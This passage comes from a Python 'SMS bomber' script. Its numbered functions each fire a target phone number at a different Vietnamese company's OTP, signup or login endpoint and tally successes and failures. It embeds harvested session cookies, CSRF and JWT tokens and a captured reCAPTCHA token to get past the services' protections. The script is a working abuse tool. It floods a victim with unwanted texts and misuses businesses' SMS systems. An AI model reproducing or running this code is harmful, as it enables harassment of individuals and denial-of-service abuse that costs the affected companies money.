        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
        'dnt': '1',
        'origin': 'https://kingme.pro',
        'referer': 'https://kingme.pro/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
    thanhcong+=1
        #--------------------------------------------------------------------------------------------------------------
#sms 4
def sms4(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'vietteltelecom.vn','Connection': 'keep-alive','X-CSRF-TOKEN': 'mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I','User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Accept': 'application/json, text/plain, */*','Referer': 'https://vietteltelecom.vn/dang-nhap',}
    data = {'phone': phone,'type': ''}
    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
#sms 5
def sms5(phone):
    global thanhcong
    global thatbai
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn',}
    response = requests.get('https://viettel.vn/dang-ky', headers=headers)
    token = response.text.split('name="csrf-token" content="')[1].split('"')[0]
    headers = {'Host': 'viettel.vn','Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','X-XSRF-TOKEN': token,'X-CSRF-TOKEN': token,'X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap',}
    data = {'msisdn': phone}
    response = requests.post('https://viettel.vn/api/get-otp', json=data, headers=headers)
    result = response.json()
    thanhcong+=1
#sms 7


#sms 10
def sms7(phone):
    global thanhcong
    global thatbai
    cookies = {'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF','__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1','XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',}
    headers = {'Accept': 'application/json, text/plain, */*','Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','DNT': '1','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/dang-nhap','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',}
    json_data = {'phone': phone,'type': '',}
    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 11--------------------------------------------------------------------------------------------------------------------------
def sms8(phone):
    global thanhcong
    global thatbai
    pw=random_string(10)
    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        'dnt': '1',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '657ca7582a4ac90054bcc10a',
        'referer': 'https://pops.vn/auth/signin-signup/signup',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sub-api-version': '1.1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-env': 'production',
    }

    json_data = {
        'fullName': '',
        'account': phone,
        'password': 'xX.j2!h5gAv',
        'confirmPassword': 'xX.j2!h5gAv',
        'recaptcha': '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
    }

    response = requests.post('https://products.popsww.com/api/v5/auths/register', headers=headers, json=json_data)
    if '"status":"PENDING"'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 14
def sms9(phone):
    global thanhcong
    global thatbai
    response = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone})
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
#sms 15
def sms10(phone):
    global thanhcong
    global thatbai
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1
#sms 16
def sms11(phone):
    global thanhcong
    global thatbai
    cookies = {
        'PHPSESSID': 'j7jhajmp8628ho9d98bckrhkog',
        '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D',
        '_ga': 'GA1.1.1223576462.1703858206',
        '__utma': '65249340.1223576462.1703858206.1703858250.1703858250.1',
        '__utmc': '65249340',
        '__utmz': '65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
        '__utmt': '1',
        '_gcl_au': '1.1.854737399.1703858251',
        '_ga_DFG3FWNPBM': 'GS1.1.1703858205.1.1.1703858365.60.0.0',
        '__utmb': '65249340.2.10.1703858250',
        '__admUTMtime': '1703858368',
        '_tt_enable_cookie': '1',
        '_ttp': 'FLrVXJT5FMP_B9az47LH6-P6_GD',
        '_ga_BBD6001M29': 'GS1.1.1703858371.1.0.1703858371.60.0.0',
        '_fbp': 'fb.1.1703858371624.505444992',
        'dtdz': '39b60b4b-5c1c-40f7-a1fa-1775072dd497',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        'Srv': 'cc204|ZY7Qz|ZY7QH',
    }

    headers = {
        'authority': 'concung.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=j7jhajmp8628ho9d98bckrhkog; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3D9wbPAi8i%2BPE%3DkUojPvEevkU%3DU%2B08xInuNgU%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3DXm3ctRf7oxM%3D9alt4piEgqQ%3DQ7x721%2FEaGg%3DuZW0GQvziBc%3D8oFXwkEqKzc%3DShKWTapcW5U%3D; _ga=GA1.1.1223576462.1703858206; __utma=65249340.1223576462.1703858206.1703858250.1703858250.1; __utmc=65249340; __utmz=65249340.1703858250.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; _gcl_au=1.1.854737399.1703858251; _ga_DFG3FWNPBM=GS1.1.1703858205.1.1.1703858365.60.0.0; __utmb=65249340.2.10.1703858250; __admUTMtime=1703858368; _tt_enable_cookie=1; _ttp=FLrVXJT5FMP_B9az47LH6-P6_GD; _ga_BBD6001M29=GS1.1.1703858371.1.0.1703858371.60.0.0; _fbp=fb.1.1703858371624.505444992; dtdz=39b60b4b-5c1c-40f7-a1fa-1775072dd497; __iid=; __iid=; __su=0; __su=0; Srv=cc204|ZY7Qz|ZY7QH',
        'dnt': '1',
        'origin': 'https://concung.com',
        'referer': 'https://concung.com/dang-nhap.html',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
        'classAjax': 'AjaxLogin',
        'methodAjax': 'sendOtpLogin',
        'customer_phone': phone,
        'statictoken': 'e633865a31fa27f35b8499e1a75b0a76',
        'captcha_key': '9a1b5162bfa438e4ead921afe49cc8d3',
        'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html?sendOtpLogin', cookies=cookies, headers=headers, data=data)
    if response.status_code == 200:
        thanhcong+=1
    else:
        thatbai+=1

#sms 24
def sms12(phone):
    global thanhcong
    cookies = {
        '_ga': 'GA1.1.2087670331.1693621115',
        'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
        'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
        'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
        '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
    }

    headers = {
        'authority': 'topenland.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_ga=GA1.1.2087670331.1693621115; ajs_anonymous_id=f03d6d9e-8b96-4989-85e4-4a2f1aa5804d; ApplicationGatewayAffinityCORS=e3a3e7f76978c3189d076edb90ce010d; ApplicationGatewayAffinity=e3a3e7f76978c3189d076edb90ce010d; _ga_05MHVHMYGR=GS1.1.1693621114.1.1.1693621123.0.0.0',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    thanhcong+=1
#sms 25
def sms13(phone):
    global thanhcong
    global thatbai
    headers = {'authority': 'api-gateway.pharmacity.vn','accept': '*/*','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/json','dnt': '1','origin': 'https://www.pharmacity.vn','referer': 'https://www.pharmacity.vn/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
    json_data = {'phone': phone,'referral': '',}
    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 26
def sms14(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'DNT': '1',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': phone,
        'languageCode': 'vi',
    }

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
    if '200' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#Note------------------------------------------------------------------
        # TUNGLEVLOG 2024
#End note----------------------------------------------------------------------------
#sms 32
def sms15(phone):
    global thanhcong
    global thatbai
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 33

#sms 34
def sms17(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'v3.meeyid.com',
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://meeyid.com',
        'referer': 'https://meeyid.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-affilate-id': 'www.google.com',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyid',
        'x-partner-id': '',
        'x-time': '1703859585701',
        'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3',
    }

    json_data = {
        'phone': phone,
        'phoneCode': '+84',
        'refCode': '',
    }

    response = requests.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', headers=headers, json=json_data)
    if '"status":true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 35
def sms18(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api.onelife.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    if 'INVALID' in response.text:
        thatbai+=1
    else:
        thanhcong+=1


#sms 42
def sms19(phone):
    global thanhcong
    cookies = {
        '_gcl_aw': 'GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE',
        '_gcl_au': '1.1.2029065449.1703860145',
        '_ga': 'GA1.1.1085625881.1703860163',
        '_ga_GFJFDNFKH2': 'GS1.1.1703860162.1.0.1703860163.0.0.0',
        '_fbp': 'fb.1.1703860165993.477455233',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '_gcl_aw=GCL.1703860145.CjwKCAiA-bmsBhAGEiwAoaQNmkA-crCLTrKUuF6c3jMX4pjr7v9SV9QZLh7wfxFdSLMSssNdkdr4QxoC3lUQAvD_BwE; _gcl_au=1.1.2029065449.1703860145; _ga=GA1.1.1085625881.1703860163; _ga_GFJFDNFKH2=GS1.1.1703860162.1.0.1703860163.0.0.0; _fbp=fb.1.1703860165993.477455233',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'ppy': 'ULWQDN',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'tuoi',
        'lastName': 'la',
        'email': 'latuoi@gmail.com',
        'password': 'cocailon',
    }

